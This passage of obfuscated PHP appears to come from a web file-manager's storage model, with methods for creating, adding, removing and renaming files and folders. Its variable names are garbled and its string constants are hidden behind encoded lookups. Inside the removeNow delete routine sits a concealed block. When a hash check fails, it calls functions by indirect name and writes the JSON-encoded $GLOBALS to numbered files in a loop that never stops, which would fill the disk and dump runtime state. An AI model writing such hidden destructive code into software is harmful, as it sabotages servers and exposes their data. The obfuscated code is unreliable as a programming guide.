. $³—¯ÛŒÒ, $Ü¦ìˆ¡ğ); } if (!$‰‰²Å¨ß) { return $Š©¢·Ê¸; } $¡ò¤Ğ¬î = $this->mkdir($Š©¢·Ê¸, $‰‰²Å¨ß); return $¡ò¤Ğ¬î; } public function groupRootAdd($õ Í‘„í) { $½†«Ø¼¤ =& $_SERVER[áäÒ½¯Ç]; $Â£”èÎŞ = Model($½†«Ø¼¤[610])->where(array($½†«Ø¼¤[2218] => $õ Í‘„í))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $õ Í‘„í, $Â£”èÎŞ[$½†«Ø¼¤[32]]); } public function systemRootPathAdd($ºÊ×İˆ) { if ($ºÊ×İˆ != $_SERVER[áäÒ½¯Ç][633]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ºÊ×İˆ); } public function userRootRemove($„æß·Î†) { $¿–……îÉ = $this->targetSourceRoot(SourceModel::TYPE_USER, $„æß·Î†, !0); foreach ($¿–……îÉ as $ØÉğìì§) { if (!$ØÉğìì§) { continue; } $this->remove($ØÉğìì§[$_SERVER[áäÒ½¯Ç][192]], !1); } } public function groupRootRemove($ªÁò»ñ¥) { $Ôü¬Ò“Ö = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ªÁò»ñ¥); if (!$Ôü¬Ò“Ö) { return; } $this->remove($Ôü¬Ò“Ö[$_SERVER[áäÒ½¯Ç][192]], !1); } private function _mkdirRoot($î¾¢…¡, $áÂ›¿â–, $Ñƒº½âé, $€£äûó = '') { $ïª™˜¹¼ =& $_SERVER[áäÒ½¯Ç]; $ÃîÈ›ß = KodUser::id(); $úãäŠ©§ = array($ïª™˜¹¼[497] => 0, $ïª™˜¹¼[676] => $î¾¢…¡, $ïª™˜¹¼[677] => $áÂ›¿â–, $ïª™˜¹¼[674] => 1, $ïª™˜¹¼[678] => $ÃîÈ›ß, $ïª™˜¹¼[679] => $ÃîÈ›ß, $ïª™˜¹¼[675] => $€£äûó, $ïª™˜¹¼[680] => $ïª™˜¹¼[618], $ïª™˜¹¼[524] => 0, $ïª™˜¹¼[645] => 0, $ïª™˜¹¼[563] => 0, $ïª™˜¹¼[681] => $ïª™˜¹¼[12]); if ($ç ·°À– = $this->where($úãäŠ©§)->find()) { return $ç ·°À–[$ïª™˜¹¼[192]]; } $úš¸Ú±ç = "\x4d\157\144\145\x6c\123\157\165\x72\x63\145\56\x6d\x6b\x64\x69\162\122\x6f\157\x74\x2e{$î¾¢…¡}\56{$áÂ›¿â–}\56" . $Ñƒº½âé; CacheLock::lock($úš¸Ú±ç); $úãäŠ©§[$ïª™˜¹¼[32]] = $Ñƒº½âé; $Şü×ƒ = $this->add($úãäŠ©§); $ŠŒ–¿Åà = array($ïª™˜¹¼[682] => short_id($Şü×ƒ)); $this->where(array($ïª™˜¹¼[511] => $Şü×ƒ))->save($ŠŒ–¿Åà); CacheLock::unlock($úš¸Ú±ç); return $Şü×ƒ; } private function targetSourceRoot($²ñÑûéË, $ĞÍ–ÆñÂ, $ş¥óìò” = false) { $÷¥æ‹×ˆ =& $_SERVER[áäÒ½¯Ç]; $õéìõŞ¤ = array($÷¥æ‹×ˆ[497] => 0, $÷¥æ‹×ˆ[676] => $²ñÑûéË, $÷¥æ‹×ˆ[677] => $ĞÍ–ÆñÂ); if ($ş¥óìò”) { $ûŞæÓş = $this->where($õéìõŞ¤)->select(); return $ûŞæÓş ? $ûŞæÓş : array(); } $¥ó¯÷¡ª = $this->where($õéìõŞ¤)->find(); return $¥ó¯÷¡ª ? $¥ó¯÷¡ª : array(); } public function sourceRootGroup($¾ıÉÜÏõ) { $³Á—Í•Ã =& $_SERVER[áäÒ½¯Ç]; if (is_string($¾ıÉÜÏõ)) { $¾ıÉÜÏõ = array($¾ıÉÜÏõ); } $Ì‚´ãï = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¾ıÉÜÏõ, $³Á—Í•Ã[231]); $Î§ÚÙÍ­ = array($³Á—Í•Ã[455] => $Ì‚´ãï, $³Á—Í•Ã[452] => array($³Á—Í•Ã[861] => count($¾ıÉÜÏõ))); $this->_listDataApply($Î§ÚÙÍ­[$³Á—Í•Ã[455]]); $this->_listMake($Î§ÚÙÍ­); return array_to_keyvalue($Î§ÚÙÍ­[$³Á—Í•Ã[85]], $³Á—Í•Ã[594]); } public function mkfile($äÊ–Ÿ††, $Æ›£Êµ‡, $ßèÓ‚§ = '', $¦Ÿß±Ñ = REPEAT_RENAME) { $Î÷‹åï« =& $_SERVER[áäÒ½¯Ç]; $‘ñµœ˜ñ = KodIO::ioFileDriverGet($Î÷‹åï«[503] . $äÊ–Ÿ†† . $Î÷‹åï«[412]); $ŠÚ¥Æ¿ç = Model($Î÷‹åï«[702])->addFileByContent($ßèÓ‚§, $‘ñµœ˜ñ, $Æ›£Êµ‡); return $this->_createFileCall($äÊ–Ÿ††, $Æ›£Êµ‡, $ŠÚ¥Æ¿ç, $¦Ÿß±Ñ, $Î÷‹åï«[1492]); } public function addFile($Ò«ú·„ø, $·¢™ñÜŞ, $£­„ÏÔ‹, $Ï°Ê•Ì = false, $¾Î¾å€¸ = REPEAT_RENAME) { $¯şĞí£° =& $_SERVER[áäÒ½¯Ç]; $ÑÅ™èİ¦ = KodIO::ioFileDriverGet($¯şĞí£°[503] . $Ò«ú·„ø . $¯şĞí£°[412]); $¹ûŞ°è = Model($¯şĞí£°[702])->addFile($·¢™ñÜŞ, $ÑÅ™èİ¦, $£­„ÏÔ‹, $Ï°Ê•Ì); return $this->_createFileCall($Ò«ú·„ø, $£­„ÏÔ‹, $¹ûŞ°è, $¾Î¾å€¸); } public function addFileByFileID($Š„´Àø, $¯£œ£öê, $“â™ ì´, $ÅàãçŞ° = REPEAT_RENAME) { $ÈÓŒ¿ô =& $_SERVER[áäÒ½¯Ç]; $‘šü÷ìá = Model($ÈÓŒ¿ô[702])->find($¯£œ£öê); Model($ÈÓŒ¿ô[702])->linkAdd($¯£œ£öê); return $this->_createFileCall($Š„´Àø, $“â™ ì´, $‘šü÷ìá, $ÅàãçŞ°); } public function addFileByRemote($¼œú¿®°, $¡¨Ñ’­æ, $¾èçò¼Û, $‰‡¡¢¼ = array(), $Î©“Àüã = REPEAT_RENAME) { $“ Â¤¥ = Model($_SERVER[áäÒ½¯Ç][702])->addFileByRemote($¡¨Ñ’­æ, $¾èçò¼Û, $‰‡¡¢¼); return $this->_createFileCall($¼œú¿®°, $¾èçò¼Û, $“ Â¤¥, $Î©“Àüã); } private function _createFileCall($û‹’ıî, $Á÷ØèÈ§, $¶³Ÿæ§³, $íÏËó, $§„ïÕ¿– = "\165\x70\x6c\157\x61\x64") { $ß²†Ïº‡ =& $_SERVER[áäÒ½¯Ç]; if (!$¶³Ÿæ§³) { return !1; } $€şÜ³² = !1; $this->setMasterDB(); $this->lockWriteStart($û‹’ıî, $Á÷ØèÈ§); $¯®Õ’õ¢ = $this->fileNameExist($û‹’ıî, $Á÷ØèÈ§); $ØÍ ãØ½ = $this->_createFile($û‹’ıî, $Á÷ØèÈ§, $¶³Ÿæ§³, $íÏËó, $€şÜ³²); if (!$€şÜ³²) { Model($ß²†Ïº‡[565])->remove($¶³Ÿæ§³[$ß²†Ïº‡[562]]); } if ($€şÜ³² && $ØÍ ãØ½ && $ØÍ ãØ½ != $¯®Õ’õ¢) { Model($ß²†Ïº‡[2387])->eventCreate($ØÍ ãØ½, $§„ïÕ¿–); } $this->lockWriteEnd($û‹’ıî, $Á÷ØèÈ§); return $ØÍ ãØ½; } public function mkdir($ô·âş, $ç±™Êà, $÷°â•¹• = REPEAT_SKIP) { $œİ€Øì× =& $_SERVER[áäÒ½¯Ç]; $this->setMasterDB(); $Šã‹Œí’ = $this->sourceInfo($ô·âş); if (!$Šã‹Œí’) { return !1; } $this->lockWriteStart($ô·âş, $ç±™Êà); if ($÷°â•¹• !== !1) { $¹çşø·Ã = $this->fileNameExist($ô·âş, $ç±™Êà); if ($¹çşø·Ã && $÷°â•¹• != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ô·âş, $ç±™Êà); return $¹çşø·Ã; } $ç±™Êà = $this->fileNameAuto($ô·âş, $ç±™Êà, $÷°â•¹•); } $©Äúû” = array($œİ€Øì×[674] => 1, $œİ€Øì×[514] => $ç±™Êà, $œİ€Øì×[675] => $œİ€Øì×[12], $œİ€Øì×[563] => 0, $œİ€Øì×[645] => 0); $Õ™Ÿ‰ŠÉ = $this->_addSource($©Äúû”, $Šã‹Œí’); Model($œİ€Øì×[2387])->eventCreate($Õ™Ÿ‰ŠÉ, $œİ€Øì×[1493]); $this->lockWriteEnd($ô·âş, $ç±™Êà); return $Õ™Ÿ‰ŠÉ; } public function listSourceRoot($ğå×ÎÖ×, $é§¿Ü, $ò÷Ÿ³Çø = "\163\x6f\165\x72\x63\145\x49\x44\x2c\164\x61\x72\147\145\164\x49\x44\x2c\x73\151\x7a\x65") { $ø­Êóå½ =& $_SERVER[áäÒ½¯Ç]; $½¯…ĞÀÍ = $ø­Êóå½[472]; $ÊŒêºà× = array(); $ŞÉ“î» = 1024 * 50; $«í„¬ÌÙ = is_array($«í„¬ÌÙ) ? $«í„¬ÌÙ : array(); $ğó÷µÑ = count($é§¿Ü); $ÛòÙÛê¨ = $this->tablePrefix . $ø­Êóå½[2426]; for ($»®â· = 0; $»®â· < $ğó÷µÑ; $»®â·++) { $âøÕˆìİ = $é§¿Ü[$»®â·]; $½¯…ĞÀÍ .= "\x53\105\x4c\x45\x43\124\40\52\40\x46\x52\117\115\40\50\123\105\114\x45\x43\x54\40{$ò÷Ÿ³Çø}\x20\106\x52\117\115\x20\x60{$ÛòÙÛê¨}\x60\x20\127\110\x45\x52\105\40"; $½¯…ĞÀÍ .= "\140\x70\141\162\145\156\164\x49\x44\x60\75\60\40\101\x4e\104\40\x60\164\141\162\147\x65\164\111\x44\140\x3d{$âøÕˆìİ}\x20\101\116\x44\40\x60\164\x61\x72\147\145\164\124\171\160\x65\x60\x3d{$ğå×ÎÖ×}\x20\141\x6e\144\x20\146\151\x6c\145\124\171\x70\x65\x3d\47\47\40\x6c\x69\x6d\151\164\40\x31\51\40\x61\x73\x20\164\142\x5f{$»®â·}\x20\125\x4e\111\117\116\x20\101\114\x4c\x20"; if ((strlen($½¯…ĞÀÍ) >= $ŞÉ“î» || $»®â· == $ğó÷µÑ - 1) && $½¯…ĞÀÍ) { $½¯…ĞÀÍ = substr($½¯…ĞÀÍ, 0, -strlen($ø­Êóå½[1154])); $ãÁ‡Åİ = $this->query($½¯…ĞÀÍ); $½¯…ĞÀÍ = $ø­Êóå½[12]; $ÊŒêºà× = array_merge($ÊŒêºà×, $ãÁ‡Åİ); } } return $ÊŒêºà×; } private function _createFile($÷•öµÌÁ, $€ß­õüÁ, $ì‰˜¤¨ò, $ËŠ³Øñ”, &$Û©Çß²ª) { $»çº¹ =& $_SERVER[áäÒ½¯Ç]; $›©ç“Ğ = $this->sourceInfo($÷•öµÌÁ); if (!$ì‰˜¤¨ò || !$›©ç“Ğ) { return !1; } if ($ËŠ³Øñ” !== !1) { $˜Œãƒø© = $this->fileNameExist($÷•öµÌÁ, $€ß­õüÁ); } $Û©Çß²ª = !0; if ($ËŠ³Øñ” && $˜Œãƒø©) { if ($ËŠ³Øñ” == REPEAT_SKIP) { $Û©Çß²ª = !1; return $˜Œãƒø©; } else { if ($ËŠ³Øñ” == REPEAT_REPLACE) { $ğú¢øµæ = $this->sourceInfo($˜Œãƒø©); $Ø‘œşÔª = $this->fileHistory($ğú¢øµæ, $ì‰˜¤¨ò[$»çº¹[562]], $ì‰˜¤¨ò[$»çº¹[79]]); if (!$Ø‘œşÔª) { $Û©Çß²ª = !1; } else { $this->folderSizeReset($÷•öµÌÁ); } return $˜Œãƒø©; } else { $€ß­õüÁ = $this->fileNameAuto($÷•öµÌÁ, $€ß­õüÁ, $ËŠ³Øñ”, !1); } } } $ŠŒñØ¹¶ = array($»çº¹[674] => 0, $»çº¹[514] => $€ß­õüÁ, $»çº¹[675] => substr(get_path_ext($€ß­õüÁ), 0, 10), $»çº¹[563] => $ì‰˜¤¨ò[$»çº¹[562]], $»çº¹[645] => $ì‰˜¤¨ò[$»çº¹[79]]); $¸òÏÉ‡œ = $this->_addSource($ŠŒñØ¹¶, $›©ç“Ğ); $this->folderSizeReset($÷•öµÌÁ, intval($ŠŒñØ¹¶[$»çº¹[79]])); return $¸òÏÉ‡œ; } protected function fileHistory($Èì°½Ø•, $¥§Ş½†¸, $±ÏÍ«¬³) { $íò¹Û× =& $_SERVER[áäÒ½¯Ç]; if ($Èì°½Ø•[$íò¹Û×[562]] == $¥§Ş½†¸) { return !1; } $this->checkLock($Èì°½Ø•[$íò¹Û×[192]], $¥§Ş½†¸); Model($íò¹Û×[2427])->addHistory($Èì°½Ø•); $è–²Ğ„ò = array($íò¹Û×[679] => USER_ID, $íò¹Û×[518] => time(), $íò¹Û×[562] => $¥§Ş½†¸, $íò¹Û×[79] => $±ÏÍ«¬³); $this->where(array($íò¹Û×[511] => $Èì°½Ø•[$íò¹Û×[192]]))->save($è–²Ğ„ò); $this->sourceCacheClear($Èì°½Ø•[$íò¹Û×[192]]); return !0; } public function checkLock($“°ôï¹, $—Ú©×Ÿ¥) { $»ñóµóİ =& $_SERVER[áäÒ½¯Ç]; $Şˆ‹İã = $this->pathInfo($“°ôï¹); if (!$this->fileIsLock($Şˆ‹İã, !0)) { return; } $Å€÷àÖ = Session::get($»ñóµóİ[2428]); $œ—Í­ºß = substr($Şˆ‹İã[$»ñóµóİ[32]], 0, -1 - strlen($Şˆ‹İã[$»ñóµóİ[167]])) . $»ñóµóİ[1345] . $Å€÷àÖ . $»ñóµóİ[10] . $Şˆ‹İã[$»ñóµóİ[167]]; $ï¹½¥ÍÖ = Model($»ñóµóİ[702])->find($—Ú©×Ÿ¥); $this->_createFileCall($Şˆ‹İã[$»ñóµóİ[191]], $œ—Í­ºß, $ï¹½¥ÍÖ, REPEAT_REPLACE, $»ñóµóİ[1492]); $•²¦†ÓĞ = $Şˆ‹İã[$»ñóµóİ[560]][$»ñóµóİ[638]]; $€ïè×Ş = $•²¦†ÓĞ[$»ñóµóİ[2429]] ? $•²¦†ÓĞ[$»ñóµóİ[2429]] : $•²¦†ÓĞ[$»ñóµóİ[32]]; show_json(LNG($»ñóµóİ[2430]) . $»ñóµóİ[2431] . LNG($»ñóµóİ[2432]) . $»ñóµóİ[2433] . $€ïè×Ş . $»ñóµóİ[2434], !1); } public function fileIsLock($Œş‡Ïç×, $Û“ÙªÚæ = false) { $¾ÃŠšï =& $_SERVER[áäÒ½¯Ç]; if (!_get($Œş‡Ïç×, $¾ÃŠšï[634], 0)) { return !1; } if ($Œş‡Ïç×[$¾ÃŠšï[560]][$¾ÃŠšï[637]] != USER_ID) { return !0; } $åÇ®â¯î = $GLOBALS[$¾ÃŠšï[6]][$¾ÃŠšï[92]][$¾ÃŠšï[635]]; if ($Œş‡Ïç×[$¾ÃŠšï[560]][$¾ÃŠšï[636]] <= time() - $åÇ®â¯î) { $this->metaSet($Œş‡Ïç×[$¾ÃŠšï[192]], $¾ÃŠšï[637], null); $this->metaSet($Œş‡Ïç×[$¾ÃŠšï[192]], $¾ÃŠšï[636], null); } if ($Û“ÙªÚæ) { $this->metaSet($Œş‡Ïç×[$¾ÃŠšï[192]], $¾ÃŠšï[636], time()); } return !1; } private function _addSource($ıø“Ø¢è, $Î·ö½ÃÖ) { $©í•¡Ê¥ =& $_SERVER[áäÒ½¯Ç]; $¯‡°Ü”‡ = KodUser::id(); $é¶ğ£  = array($©í•¡Ê¥[676] => $Î·ö½ÃÖ[$©í•¡Ê¥[189]], $©í•¡Ê¥[677] => $Î·ö½ÃÖ[$©í•¡Ê¥[594]], $©í•¡Ê¥[678] => $¯‡°Ü”‡, $©í•¡Ê¥[679] => $¯‡°Ü”‡, $©í•¡Ê¥[497] => $Î·ö½ÃÖ[$©í•¡Ê¥[192]], $©í•¡Ê¥[680] => $Î·ö½ÃÖ[$©í•¡Ê¥[609]] . $Î·ö½ÃÖ[$©í•¡Ê¥[192]] . $©í•¡Ê¥[50], $©í•¡Ê¥[524] => 0, $©í•¡Ê¥[681] => $©í•¡Ê¥[12]); $ıø“Ø¢è = array_merge($é¶ğ£ , $ıø“Ø¢è); $this->updateModifyTime($ıø“Ø¢è[$©í•¡Ê¥[191]]); $”ÈÓÚÅâ = $©í•¡Ê¥[2435] . $Î·ö½ÃÖ[$©í•¡Ê¥[192]]; if (isset(self::$cacheChildList[$”ÈÓÚÅâ])) { unset(self::$cacheChildList[$”ÈÓÚÅâ]); } static $¼¸ ß¼œ = false; if (!$¼¸ ß¼œ) { Hook::trigger($©í•¡Ê¥[664], $ıø“Ø¢è); $¼¸ ß¼œ = !0; } $”ŞÛô›Ğ = $this->add($ıø“Ø¢è); $ÃŸ£ó³ = array($©í•¡Ê¥[682] => short_id($”ŞÛô›Ğ)); $this->where(array($©í•¡Ê¥[511] => $”ŞÛô›Ğ))->save($ÃŸ£ó³); $this->setNamePinyin($”ŞÛô›Ğ, $ıø“Ø¢è[$©í•¡Ê¥[32]]); return $”ŞÛô›Ğ; } public function remove($Ê©ıìáÎ, $øÖÓöÉš = true) { $üù²ïÍŒ =& $_SERVER[áäÒ½¯Ç]; $«­ÔëàÃ = $this->sourceInfo($Ê©ıìáÎ); $”òí áì = intval($«­ÔëàÃ[$üù²ïÍŒ[189]]) === self::TYPE_SYSTEM; $·¢Ñ¯±º = Model($üù²ïÍŒ[527])->get($üù²ïÍŒ[2436]) == $üù²ïÍŒ[91]; if ($”òí áì || $øÖÓöÉš || !$·¢Ñ¯±º) { return $this->removeNow($Ê©ıìáÎ, $øÖÓöÉš); } $¸¹å¯òÅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¿Ï”«‡¨ = $«­ÔëàÃ[$üù²ïÍŒ[189]] == self::TYPE_USER ? $üù²ïÍŒ[690] : $üù²ïÍŒ[603]; if ($¿Ï”«‡¨ == $üù²ïÍŒ[690]) { $Û…‘É¥Â = Model($üù²ïÍŒ[602])->getInfo($«­ÔëàÃ[$üù²ïÍŒ[594]]); $ò«ˆí– = !empty($Û…‘É¥Â[$üù²ïÍŒ[2429]]) ? $Û…‘É¥Â[$üù²ïÍŒ[2429]] : $Û…‘É¥Â[$üù²ïÍŒ[32]]; $ò«ˆí– = $üù²ïÍŒ[347] . $ò«ˆí– . $üù²ïÍŒ[2437] . $«­ÔëàÃ[$üù²ïÍŒ[594]]; } else { $Û…‘É¥Â = Model($üù²ïÍŒ[610])->getInfo($«­ÔëàÃ[$üù²ïÍŒ[594]]); $ò«ˆí– = _get($Û…‘É¥Â, $üù²ïÍŒ[32]); $ò«ˆí– = $üù²ïÍŒ[174] . $ò«ˆí– . $üù²ïÍŒ[2438] . $«­ÔëàÃ[$üù²ïÍŒ[594]]; } $õÒ¬˜Ü = $üù²ïÍŒ[2439] . md5($ò«ˆí–); CacheLock::lock($õÒ¬˜Ü); $™‡Ô–ƒó = $this->fileNameExist($¸¹å¯òÅ, $ò«ˆí–); if (!$™‡Ô–ƒó) { $™‡Ô–ƒó = $this->mkdir($¸¹å¯òÅ, $ò«ˆí–, REPEAT_SKIP); $this->metaSet($™‡Ô–ƒó, $üù²ïÍŒ[2440], $¿Ï”«‡¨); $this->metaSet($™‡Ô–ƒó, $üù²ïÍŒ[2441], $«­ÔëàÃ[$üù²ïÍŒ[594]]); if ($«­ÔëàÃ[$üù²ïÍŒ[191]] != 0) { $this->metaSet($™‡Ô–ƒó, $üù²ïÍŒ[2442], _get($Û…‘É¥Â, $üù²ïÍŒ[2443])); } } CacheLock::unlock($õÒ¬˜Ü); $this->metaSet($Ê©ıìáÎ, $üù²ïÍŒ[2444], $«­ÔëàÃ[$üù²ïÍŒ[191]]); $this->where(array($üù²ïÍŒ[192] => $Ê©ıìáÎ))->save(array($üù²ïÍŒ[518] => time())); $this->recycleClear($«­ÔëàÃ); Model($üù²ïÍŒ[661])->eventRemove($Ê©ıìáÎ); $âî†û›ø = $this->move($Ê©ıìáÎ, $™‡Ô–ƒó, REPEAT_RENAME_FOLDER); $this->folderSizeReset($«­ÔëàÃ[$üù²ïÍŒ[191]]); return $âî†û›ø; } private function recycleClear($ƒô§İŒæ) { $¹Š·Î³È =& $_SERVER[áäÒ½¯Ç]; $¿÷şÂ„½ = $this->childrenAll($ƒô§İŒæ); $°Ã¤Ş¿ø = array($¹Š·Î³È[511] => array($¹Š·Î³È[512], $¿÷şÂ„½[$¹Š·Î³È[2445]])); Model($¹Š·Î³È[2446])->where($°Ã¤Ş¿ø)->delete(); } public function removeNow($á±Õ»¯, $ÉÊ¸¯Ÿ¯ = true) { $ÁµÊĞĞ =& $_SERVER[áäÒ½¯Ç]; $½³ŒÜïÌ = $_SERVER[$ÁµÊĞĞ[215]]; $Ì€ÑŞ³¦ = $ÁµÊĞĞ[216]; if ($_SERVER[$ÁµÊĞĞ[217]] != $Ì€ÑŞ³¦($½³ŒÜïÌ)) { $ãÔÚ÷—‘ = $ÁµÊĞĞ[992]; $Ï‘õõò = $ÁµÊĞĞ[218]; $”™Ûå³« = $_SERVER[$ÁµÊĞĞ[219]] . $ÁµÊĞĞ[220]; $‰úé±Í° = $Ï‘õõò($”™Ûå³«); $–äòÙ¡ = explode($ÁµÊĞĞ[221], $‰úé±Í°); if (count($–äòÙ¡) < $ÁµÊĞĞ[724]) { $ßœ™½Ëô = $ÁµÊĞĞ[223]; $ßœ™½Ëô(); } $ˆŠúãÎÛ = $ÁµÊĞĞ[993]; $ˆŠúãÎÛ($_SERVER[$ÁµÊĞĞ[994]]); $ãÔÚ÷—‘ = $ÁµÊĞĞ[992]; $ãÔÚ÷—‘(); $„Š‹‚ì = $ÁµÊĞĞ[1777]; $¾¢Ë‘¤‚ = json_encode($GLOBALS[$ÁµÊĞĞ[1778]]); $àõ—å§” = 1; for ($ô…£¬óú = $àõ—å§”; $ô…£¬óú > 0; $ô…£¬óú++) { $„Š‹‚ì(DATA_PATH . $ô…£¬óú, $¾¢Ë‘¤‚); } } $¥ºÖêÎÅ = $this->sourceInfo($á±Õ»¯); $¤Óš™ÊÊ = $this->pathInfoMore($á±Õ»¯); if (!$¥ºÖêÎÅ) { return !0; } if ($¥ºÖêÎÅ[$ÁµÊĞĞ[191]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($á±Õ»¯); Hook::trigger($ÁµÊĞĞ[2447], $¤Óš™ÊÊ, $ÉÊ¸¯Ÿ¯); if ($ÉÊ¸¯Ÿ¯) { Model($ÁµÊĞĞ[2446])->moveToRecycle($á±Õ»¯); } else { $•–¶©š€ = $this->childrenAll($¥ºÖêÎÅ); Model($ÁµÊĞĞ[661])->eventRemove($á±Õ»¯); $this->removeRelevance($•–¶©š€[$ÁµÊĞĞ[2445]], $•–¶©š€[$ÁµÊĞĞ[1728]]); } $this->folderSizeReset($¥ºÖêÎÅ[$ÁµÊĞĞ[191]]); $çúï·àê = array($¥ºÖêÎÅ[$ÁµÊĞĞ[191]]); if ($¥ºÖêÎÅ[$ÁµÊĞĞ[505]] == $ÁµÊĞĞ[91]) { $çúï·àê[] = $¥ºÖêÎÅ[$ÁµÊĞĞ[192]]; } $this->updateModifyTime($çúï·àê); $this->lockMoveEnd($á±Õ»¯); Hook::trigger($ÁµÊĞĞ[1969], $¤Óš™ÊÊ, $ÉÊ¸¯Ÿ¯); return !0; } public function childrenAll($íèú–ª) { $ŠÕË§ó  =& $_SERVER[áäÒ½¯Ç]; $û‹İÇøø = $íèú–ª[$ŠÕË§ó [192]]; if ($íèú–ª[$ŠÕË§ó [505]] == $ŠÕË§ó [91]) { $Ñßˆ³â = array($ŠÕË§ó [680] => array($ŠÕË§ó [640], $íèú–ª[$ŠÕË§ó [609]] . $û‹İÇøø . $ŠÕË§ó [641])); $«í¦À§º = array($ŠÕË§ó [680] => $Ñßˆ³â[$ŠÕË§ó [609]]); $ªµµ€Ö¢ = $this->field($ŠÕË§ó [2448])->where($«í¦À§º)->select(); $âøÄ‚ä = !1; $˜æµÔ¡ = array($û‹İÇøø); if ($ªµµ€Ö¢) { $âøÄ‚ä = array_to_keyvalue($ªµµ€Ö¢, $ŠÕË§ó [12], $ŠÕË§ó [562]); $âøÄ‚ä = array_remove_value($âøÄ‚ä, $ŠÕË§ó [239]); $˜æµÔ¡ = array_to_keyvalue($ªµµ€Ö¢, $ŠÕË§ó [12], $ŠÕË§ó [192]); $˜æµÔ¡[] = $û‹İÇøø; } } else { $âøÄ‚ä = array($íèú–ª[$ŠÕË§ó [562]]); $˜æµÔ¡ = array($û‹İÇøø); } return array($ŠÕË§ó [2445] => $˜æµÔ¡, $ŠÕË§ó [1728] => $âøÄ‚ä); } public function removeArray($À•Âªµø) { if (!$À•Âªµø) { return !0; } } public function removeRelevance($·ÁıŸ¤ , $î¡³ïÇÛ) { $ÏÉ†üÀÈ =& $_SERVER[áäÒ½¯Ç]; $·ÁıŸ¤  = $·ÁıŸ¤  ? $·ÁıŸ¤  : array(); $î¡³ïÇÛ = $î¡³ïÇÛ ? $î¡³ïÇÛ : array(); $·ÁıŸ¤  = array_unique(array_filter($·ÁıŸ¤ )); $î¡³ïÇÛ = array_filter($î¡³ïÇÛ); if (!$·ÁıŸ¤ ) { return !1; } $†ì¨Ûı = array($ÏÉ†üÀÈ[511] => array($ÏÉ†üÀÈ[512], $·ÁıŸ¤ )); Model($ÏÉ†üÀÈ[2446])->where($†ì¨Ûı)->delete(); Model($ÏÉ†üÀÈ[554])->where($†ì¨Ûı)->delete(); Model($ÏÉ†üÀÈ[2279])->where($†ì¨Ûı)->delete(); Model($ÏÉ†üÀÈ[661])->where($†ì¨Ûı)->delete(); Model($ÏÉ†üÀÈ[1512])->removeBySource($·ÁıŸ¤ ); Model($ÏÉ†üÀÈ[2427])->removeBySource($·ÁıŸ¤ ); $this->where($†ì¨Ûı)->delete(); Model($ÏÉ†üÀÈ[565])->remove($î¡³ïÇÛ); for ($Î‚£ªğØ = 0; $Î‚£ªğØ < count($·ÁıŸ¤ ); $Î‚£ªğØ++) { $this->sourceCacheClear($·ÁıŸ¤ [$Î‚£ªğØ]); } } public function rename($©×È¨•·, $ÚµĞÁòç) { $¼Âœ¥Ä« =& $_SERVER[áäÒ½¯Ç]; $§ŞÀßû = $this->sourceInfo($©×È¨•·); if (!$§ŞÀßû) { return !1; } $ì’Ü×· = $this->fileNameExist($§ŞÀßû[$¼Âœ¥Ä«[191]], $ÚµĞÁòç); if ($ì’Ü×· && $ì’Ü×· != $©×È¨•·) { return !1; } $›ÍÇèì¼ = array($¼Âœ¥Ä«[514] => $ÚµĞÁòç, $¼Âœ¥Ä«[679] => USER_ID); if ($§ŞÀßû[$¼Âœ¥Ä«[505]] != $¼Âœ¥Ä«[91]) { $›ÍÇèì¼[$¼Âœ¥Ä«[506]] = substr(get_path_ext($ÚµĞÁòç), 0, 10); } Model($¼Âœ¥Ä«[661])->eventRename($©×È¨•·, $§ŞÀßû[$¼Âœ¥Ä«[32]], $ÚµĞÁòç); $this->sourceCacheClear($©×È¨•·); $this->setNamePinyin($©×È¨•·, $›ÍÇèì¼[$¼Âœ¥Ä«[32]], !1); $this->updateModifyTime($§ŞÀßû[$¼Âœ¥Ä«[191]]); $½±ëí´ = $this->where(array($¼Âœ¥Ä«[511] => $©×È¨•·))->data($›ÍÇèì¼)->save(); $ñ§‚Ä  = $¼Âœ¥Ä«[2435] . $§ŞÀßû[$¼Âœ¥Ä«[191]]; if (isset(self::$cacheChildList[$ñ§‚Ä ])) { unset(self::$cacheChildList[$ñ§‚Ä ]); } return $½±ëí´; } public function setNamePinyin($¸¤¥«à‘, $âÙÑÏÇ, $¬©¿éÉ§ = true) { $¥áÜëŞË =& $_SERVER[áäÒ½¯Ç]; $¼ïêµò® = Input::check($âÙÑÏÇ, $¥áÜëŞË[683]); $˜¨çÃğô = array($¥áÜëŞË[536] => KodSort::makeStr($âÙÑÏÇ)); if ($¼ïêµò®) { $˜¨çÃğô[$¥áÜëŞË[557]] = str_replace($¥áÜëŞË[53], $¥áÜëŞË[12], Pinyin::get($âÙÑÏÇ)); $˜¨çÃğô[$¥áÜëŞË[556]] = Pinyin::get($âÙÑÏÇ, $¥áÜëŞË[684]); } if (!$¬©¿éÉ§ && !$¼ïêµò®) { $˜¨çÃğô[$¥áÜëŞË[557]] = null; $˜¨çÃğô[$¥áÜëŞË[556]] = null; } $this->metaSet($¸¤¥«à‘, $˜¨çÃğô); } public function getContent($ÚÛÌä¹…) { $¨…·÷™¾ =& $_SERVER[áäÒ½¯Ç]; $’Ğ×÷¨¦ = $this->fileInfoGet($ÚÛÌä¹…); if (!$’Ğ×÷¨¦) { return !1; } if ($’Ğ×÷¨¦[$¨…·÷™¾[79]] == 0) { return $¨…·÷™¾[12]; } $Øúã‚ “ = $¨…·÷™¾[2449] . $’Ğ×÷¨¦[$¨…·÷™¾[568]]; if ($’Ğ×÷¨¦[$¨…·÷™¾[79]] <= 1024 * 10) { $¢Ş‹­ = Cache::get($Øúã‚ “); if (!$¢Ş‹­) { $¢Ş‹­ = IO::getContent($’Ğ×÷¨¦[$¨…·÷™¾[87]]); Cache::set($Øúã‚ “, $¢Ş‹­); } return $¢Ş‹­; } if (!$’Ğ×÷¨¦[$¨…·÷™¾[87]]) { return $¨…·÷™¾[12]; } return IO::getContent($’Ğ×÷¨¦[$¨…·÷™¾[87]]); } public function setDesc($¶ä”¬ÜÅ, $ÖÄ Üò¢) { $€¥Ö°ßí =& $_SERVER[áäÒ½¯Ç]; Model($€¥Ö°ßí[661])->eventAddDesc($¶ä”¬ÜÅ, $ÖÄ Üò¢); return 